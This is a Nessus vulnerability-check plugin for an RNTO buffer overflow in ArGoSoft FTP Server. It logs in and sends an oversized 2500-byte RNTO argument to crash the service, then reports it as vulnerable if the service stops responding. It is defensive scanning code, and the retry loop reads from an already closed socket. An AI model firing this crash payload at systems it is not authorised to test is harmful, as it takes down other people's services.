#
# (C) Tenable Network Security
#


 desc = "
Synopsis :

The remote FTP server is affected by a buffer overflow vulnerability. 

Description :

The remote host is using ArGoSoft FTP Server, an FTP server for
Windows. 

The version of ArGoSoft FTP Server installed on the remote host
contains a buffer overflow vulnerability that can be exploited by an
authenticated, but possibly anonymous, user with a specially-crafted
RNTO command to crash the affected application or execute arbitrary
code on the affected host. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2006-05/0023.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:N/A:P/B:N)";


if (description)
{
  script_id(21326);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2170");
  script_bugtraq_id(17789);
 
  script_name(english:"ArGoSoft FTP Server RNTO Command Buffer Overflow Vulnerability");
  script_summary(english:"Checks for RNTO command buffer overflow vulnerability in ArGoSoft FTP Server");
 
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Make sure it's ArGoSoft.
banner = get_ftp_banner(port:port);
if (!banner || "ArGoSoft" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials; skipped!", level:0);
  close(soc);
  exit(1);
}


# Try to exploit the flaw to crash the daemon.
#
# nb: the file doesn't need to exist.
c = string("RNFR ", SCRIPT_NAME, "-", unixtime());
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if (s && "350 Requested file action" >< s)
{
  c = string("RNTO ", crap(data:"A", length:2500));
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  close(soc);

  # If we didn't get a response...
  if (!s)
  {
    tries = 5;
    for (iter = 0; iter < tries; iter++)
    {
      # Check whether it's truly down.
      soc2 = open_sock_tcp(port);
      if (soc2)
      {
        s = ftp_recv_line(socket:soc);
        close(soc2);
        sleep(1);
      }
      else
      {
        security_warning(port); 
        exit(0);
      }
    }
  }
}
